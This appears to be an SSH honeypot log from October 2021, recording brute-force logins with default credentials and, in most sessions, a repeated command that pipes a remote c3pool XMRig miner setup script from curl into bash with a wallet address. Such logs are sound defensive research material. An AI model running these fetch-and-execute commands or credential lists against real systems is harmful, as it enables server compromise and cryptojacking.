+2021-10-29 13:42:33,444 - root - INFO - Client mac (68.183.180.46): hmac-sha1
+2021-10-29 13:42:33,444 - root - INFO - Client compression (68.183.180.46): none
+2021-10-29 13:42:33,444 - root - INFO - Client SSH version (68.183.180.46): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:42:33,444 - root - INFO - Client SSH cipher (68.183.180.46): aes128-ctr
+2021-10-29 13:42:33,629 - root - INFO - New URL detected (68.183.180.46): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:42:33,630 - root - INFO - client sent command via check_channel_exec_request (68.183.180.46): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR'
+2021-10-29 13:42:36,952 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:42:43,445 - root - INFO - ** Client (68.183.180.46): never asked for a shell
+2021-10-29 13:42:47,026 - root - INFO - New connection from: 159.223.24.19
+2021-10-29 13:42:47,032 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:42:47,170 - root - INFO - new client credentials (159.223.24.19): username: root, password: root
+2021-10-29 13:42:47,170 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:42:47,193 - root - INFO - client called check_channel_request (159.223.24.19): session
+2021-10-29 13:42:47,194 - root - INFO - Client mac (159.223.24.19): hmac-sha1
+2021-10-29 13:42:47,194 - root - INFO - Client compression (159.223.24.19): none
+2021-10-29 13:42:47,194 - root - INFO - Client SSH version (159.223.24.19): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:42:47,194 - root - INFO - Client SSH cipher (159.223.24.19): aes128-ctr
+2021-10-29 13:42:47,218 - root - INFO - New URL detected (159.223.24.19): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:42:47,218 - root - INFO - client sent command via check_channel_exec_request (159.223.24.19): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR'
+2021-10-29 13:42:57,194 - root - INFO - ** Client (159.223.24.19): never asked for a shell
+2021-10-29 13:43:21,370 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:43:21,373 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:43:22,457 - root - INFO - new client credentials (209.141.60.103): username: odoo, password: odoo
+2021-10-29 13:43:22,457 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:43:22,608 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:43:22,608 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:43:22,608 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:43:22,608 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:43:22,608 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:43:22,773 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:43:22,774 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:43:32,608 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:43:43,112 - root - INFO - New connection from: 159.223.24.19
+2021-10-29 13:43:43,114 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:43:43,250 - root - INFO - new client credentials (159.223.24.19): username: root, password: admin123
+2021-10-29 13:43:43,250 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:43:43,273 - root - INFO - client called check_channel_request (159.223.24.19): session
+2021-10-29 13:43:43,274 - root - INFO - Client mac (159.223.24.19): hmac-sha1
+2021-10-29 13:43:43,274 - root - INFO - Client compression (159.223.24.19): none
+2021-10-29 13:43:43,274 - root - INFO - Client SSH version (159.223.24.19): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:43:43,274 - root - INFO - Client SSH cipher (159.223.24.19): aes128-ctr
+2021-10-29 13:43:43,298 - root - INFO - New URL detected (159.223.24.19): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:43:43,299 - root - INFO - client sent command via check_channel_exec_request (159.223.24.19): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR'
+2021-10-29 13:43:53,274 - root - INFO - ** Client (159.223.24.19): never asked for a shell
+2021-10-29 13:44:16,549 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:44:16,554 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:44:17,434 - root - INFO - new client credentials (209.141.60.103): username: deploy, password: deploy
+2021-10-29 13:44:17,434 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:44:17,664 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:44:17,665 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:44:17,665 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:44:17,665 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:44:17,665 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:44:17,883 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:44:17,883 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:44:27,665 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:44:38,782 - root - INFO - New connection from: 159.223.24.19
+2021-10-29 13:44:38,784 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:44:38,940 - root - INFO - new client credentials (159.223.24.19): username: root, password: eve
+2021-10-29 13:44:38,940 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:44:38,966 - root - INFO - client called check_channel_request (159.223.24.19): session
+2021-10-29 13:44:38,966 - root - INFO - Client mac (159.223.24.19): hmac-sha1
+2021-10-29 13:44:38,966 - root - INFO - Client compression (159.223.24.19): none
+2021-10-29 13:44:38,966 - root - INFO - Client SSH version (159.223.24.19): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:44:38,966 - root - INFO - Client SSH cipher (159.223.24.19): aes128-ctr
+2021-10-29 13:44:38,992 - root - INFO - New URL detected (159.223.24.19): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:44:38,992 - root - INFO - client sent command via check_channel_exec_request (159.223.24.19): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR'
+2021-10-29 13:44:48,967 - root - INFO - ** Client (159.223.24.19): never asked for a shell
+2021-10-29 13:45:09,514 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:45:09,522 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:45:10,284 - root - INFO - new client credentials (209.141.60.103): username: root, password: china123
+2021-10-29 13:45:10,284 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:45:10,433 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:45:10,433 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:45:10,434 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:45:10,434 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:45:10,434 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:45:10,590 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:45:10,590 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:45:20,434 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:45:33,107 - root - INFO - New connection from: 159.223.24.19
+2021-10-29 13:45:33,108 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:45:33,257 - root - INFO - new client credentials (159.223.24.19): username: ossuser, password: Changeme_123
+2021-10-29 13:45:33,257 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:45:33,283 - root - INFO - client called check_channel_request (159.223.24.19): session
+2021-10-29 13:45:33,283 - root - INFO - Client mac (159.223.24.19): hmac-sha1
+2021-10-29 13:45:33,283 - root - INFO - Client compression (159.223.24.19): none
+2021-10-29 13:45:33,283 - root - INFO - Client SSH version (159.223.24.19): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:45:33,283 - root - INFO - Client SSH cipher (159.223.24.19): aes128-ctr
+2021-10-29 13:45:33,308 - root - INFO - New URL detected (159.223.24.19): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:45:33,309 - root - INFO - client sent command via check_channel_exec_request (159.223.24.19): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR'
+2021-10-29 13:45:43,284 - root - INFO - ** Client (159.223.24.19): never asked for a shell
+2021-10-29 13:46:04,248 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:46:04,251 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:46:05,025 - root - INFO - new client credentials (209.141.60.103): username: jenkins, password: jenkins
+2021-10-29 13:46:05,025 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:46:05,171 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:46:05,172 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:46:05,172 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:46:05,172 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:46:05,172 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:46:05,329 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:46:05,329 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:46:14,902 - root - INFO - New connection from: 2.122.97.132
+2021-10-29 13:46:14,908 - paramiko.transport - INFO - Connected (version 2.0, client OpenSSH_8.1)
+2021-10-29 13:46:15,172 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:46:25,887 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 13:46:25,887 - root - INFO - client called get_allowed_auths (2.122.97.132) with username ubuntu
+2021-10-29 13:46:25,929 - root - INFO - client public key (2.122.97.132): username: ubuntu, key name: ssh-ed25519, md5 fingerprint: c30145e16347cc61951b61355bb38441, base64: AAAAC3NzaC1lZDI1NTE5AAAAIO/FagDcbw83jb+Mo5OK3Z5b7stmF3+bCxw+V0gpRWrI, bits: 256
+2021-10-29 13:46:26,036 - root - INFO - New connection from: 159.223.24.19
+2021-10-29 13:46:26,044 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:46:26,190 - root - INFO - new client credentials (159.223.24.19): username: root, password: 1111111
+2021-10-29 13:46:26,190 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:46:26,217 - root - INFO - client called check_channel_request (159.223.24.19): session
+2021-10-29 13:46:26,217 - root - INFO - Client mac (159.223.24.19): hmac-sha1
+2021-10-29 13:46:26,217 - root - INFO - Client compression (159.223.24.19): none
+2021-10-29 13:46:26,217 - root - INFO - Client SSH version (159.223.24.19): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:46:26,217 - root - INFO - Client SSH cipher (159.223.24.19): aes128-ctr
+2021-10-29 13:46:26,242 - root - INFO - New URL detected (159.223.24.19): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:46:26,242 - root - INFO - client sent command via check_channel_exec_request (159.223.24.19): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR'
+2021-10-29 13:46:36,217 - root - INFO - ** Client (159.223.24.19): never asked for a shell
+2021-10-29 13:46:58,387 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:46:58,388 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:46:59,563 - root - INFO - new client credentials (209.141.60.103): username: root, password: admin
+2021-10-29 13:46:59,563 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:46:59,713 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:46:59,714 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:46:59,714 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:46:59,714 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:46:59,714 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:47:00,276 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:47:00,276 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:47:09,714 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:47:17,772 - root - INFO - New connection from: 159.223.24.19
+2021-10-29 13:47:17,773 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:47:17,927 - root - INFO - new client credentials (159.223.24.19): username: root, password: 0
+2021-10-29 13:47:17,927 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:47:17,952 - root - INFO - client called check_channel_request (159.223.24.19): session
+2021-10-29 13:47:17,953 - root - INFO - Client mac (159.223.24.19): hmac-sha1
+2021-10-29 13:47:17,953 - root - INFO - Client compression (159.223.24.19): none
+2021-10-29 13:47:17,953 - root - INFO - Client SSH version (159.223.24.19): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:47:17,953 - root - INFO - Client SSH cipher (159.223.24.19): aes128-ctr
+2021-10-29 13:47:17,979 - root - INFO - New URL detected (159.223.24.19): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:47:17,980 - root - INFO - client sent command via check_channel_exec_request (159.223.24.19): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44XKLDbSztdXqao2Rs2EFFLvdjsbRwYrP1FkqdqB91v1PohHdSSTjyeKQ4t6UMFXNdYpxkNhwpi9xTRmEsk6PeUSLHCfeLR'
+2021-10-29 13:47:27,953 - root - INFO - ** Client (159.223.24.19): never asked for a shell
+2021-10-29 13:47:53,049 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:47:53,050 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:47:53,822 - root - INFO - new client credentials (209.141.60.103): username: root, password: China123
+2021-10-29 13:47:53,822 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:47:53,970 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:47:53,971 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:47:53,971 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:47:53,971 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:47:53,971 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:47:54,120 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:47:54,120 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:48:03,971 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:48:47,317 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:48:47,318 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:48:48,989 - root - INFO - new client credentials (209.141.60.103): username: admin, password: We1come2msc!
+2021-10-29 13:48:48,990 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:48:49,153 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:48:49,154 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:48:49,154 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:48:49,154 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:48:49,154 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:48:49,313 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:48:49,314 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:48:59,154 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:49:41,959 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:49:41,964 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:49:42,751 - root - INFO - new client credentials (209.141.60.103): username: admin, password: we1come!
+2021-10-29 13:49:42,751 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:49:42,908 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:49:42,908 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:49:42,908 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:49:42,908 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:49:42,908 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:49:43,060 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:49:43,061 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:49:52,909 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:49:53,606 - root - INFO - New connection from: 130.209.157.50
+2021-10-29 13:49:53,608 - paramiko.transport - INFO - Connected (version 2.0, client PuTTY_Release_0.76)
+2021-10-29 13:50:06,343 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 13:50:06,343 - root - INFO - client called get_allowed_auths (130.209.157.50) with username ssh ubuntu
+2021-10-29 13:50:10,101 - root - INFO - new client credentials (130.209.157.50): username: ssh ubuntu, password: 
+2021-10-29 13:50:10,101 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:50:10,264 - root - INFO - client called check_channel_request (130.209.157.50): session
+2021-10-29 13:50:10,264 - root - INFO - Client mac (130.209.157.50): hmac-sha2-256
+2021-10-29 13:50:10,264 - root - INFO - Client compression (130.209.157.50): none
+2021-10-29 13:50:10,264 - root - INFO - Client SSH version (130.209.157.50): SSH-2.0-PuTTY_Release_0.76
+2021-10-29 13:50:10,264 - root - INFO - Client SSH cipher (130.209.157.50): aes256-ctr
+2021-10-29 13:50:32,832 - root - INFO - Command received (130.209.157.50): lsccd
+2021-10-29 13:50:32,832 - root - INFO - Response from honeypot (130.209.157.50): 
+2021-10-29 13:50:39,696 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:50:39,701 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:50:40,921 - root - INFO - Command received (130.209.157.50): ls
+2021-10-29 13:50:40,922 - root - INFO - Response from honeypot (130.209.157.50): 
+2021-10-29 13:50:41,266 - root - INFO - new client credentials (209.141.60.103): username: root, password: cisco
+2021-10-29 13:50:41,266 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:50:41,412 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:50:41,413 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:50:41,413 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:50:41,413 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:50:41,413 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:50:41,559 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:50:41,560 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:50:46,876 - root - INFO - Command received (130.209.157.50): abc
+2021-10-29 13:50:51,386 - root - INFO - Command received (130.209.157.50): xyz
+2021-10-29 13:50:51,413 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:50:53,132 - root - INFO - Command received (130.209.157.50): ls
+2021-10-29 13:50:53,132 - root - INFO - Response from honeypot (130.209.157.50): 
+2021-10-29 13:51:01,647 - root - INFO - Command received (130.209.157.50): nanaoo
+2021-10-29 13:51:07,404 - root - INFO - Command received (130.209.157.50): cd
+2021-10-29 13:51:16,255 - root - INFO - Command received (130.209.157.50): nano user
+2021-10-29 13:51:25,122 - root - INFO - Command received (130.209.157.50): nano user.txt
+2021-10-29 13:51:32,773 - root - INFO - New connection from: 2.122.97.132
+2021-10-29 13:51:32,775 - paramiko.transport - INFO - Connected (version 2.0, client OpenSSH_8.1)
+2021-10-29 13:51:33,007 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 13:51:33,007 - root - INFO - client called get_allowed_auths (2.122.97.132) with username ubuntu
+2021-10-29 13:51:33,051 - root - INFO - client public key (2.122.97.132): username: ubuntu, key name: ssh-ed25519, md5 fingerprint: c30145e16347cc61951b61355bb38441, base64: AAAAC3NzaC1lZDI1NTE5AAAAIO/FagDcbw83jb+Mo5OK3Z5b7stmF3+bCxw+V0gpRWrI, bits: 256
+2021-10-29 13:51:37,242 - root - INFO - client public key (2.122.97.132): username: ubuntu, key name: ssh-ed25519, md5 fingerprint: c30145e16347cc61951b61355bb38441, base64: AAAAC3NzaC1lZDI1NTE5AAAAIO/FagDcbw83jb+Mo5OK3Z5b7stmF3+bCxw+V0gpRWrI, bits: 256
+2021-10-29 13:51:37,243 - paramiko.transport - INFO - Auth rejected (publickey).
+2021-10-29 13:51:37,243 - root - INFO - client called get_allowed_auths (2.122.97.132) with username ubuntu
+2021-10-29 13:51:37,286 - root - INFO - client public key (2.122.97.132): username: ubuntu, key name: ssh-ed25519, md5 fingerprint: c30145e16347cc61951b61355bb38441, base64: AAAAC3NzaC1lZDI1NTE5AAAAIO/FagDcbw83jb+Mo5OK3Z5b7stmF3+bCxw+V0gpRWrI, bits: 256
+2021-10-29 13:51:37,563 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:51:37,568 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:51:38,354 - root - INFO - new client credentials (209.141.60.103): username: sysadmin, password: sysadmin
+2021-10-29 13:51:38,354 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:51:38,505 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:51:38,506 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:51:38,506 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:51:38,506 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:51:38,506 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:51:38,656 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:51:38,656 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:51:40,543 - root - INFO - client public key (2.122.97.132): username: ubuntu, key name: ssh-ed25519, md5 fingerprint: c30145e16347cc61951b61355bb38441, base64: AAAAC3NzaC1lZDI1NTE5AAAAIO/FagDcbw83jb+Mo5OK3Z5b7stmF3+bCxw+V0gpRWrI, bits: 256
+2021-10-29 13:51:40,543 - paramiko.transport - INFO - Auth rejected (publickey).
+2021-10-29 13:51:40,544 - root - INFO - client called get_allowed_auths (2.122.97.132) with username ubuntu
+2021-10-29 13:51:40,680 - root - INFO - client public key (2.122.97.132): username: ubuntu, key name: ssh-ed25519, md5 fingerprint: c30145e16347cc61951b61355bb38441, base64: AAAAC3NzaC1lZDI1NTE5AAAAIO/FagDcbw83jb+Mo5OK3Z5b7stmF3+bCxw+V0gpRWrI, bits: 256
+2021-10-29 13:51:48,506 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:52:33,840 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:52:33,842 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:52:34,630 - root - INFO - new client credentials (209.141.60.103): username: admin, password: 12345
+2021-10-29 13:52:34,630 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:52:34,782 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:52:34,782 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:52:34,783 - root - INFO - Client compression (209.141.60.103): none
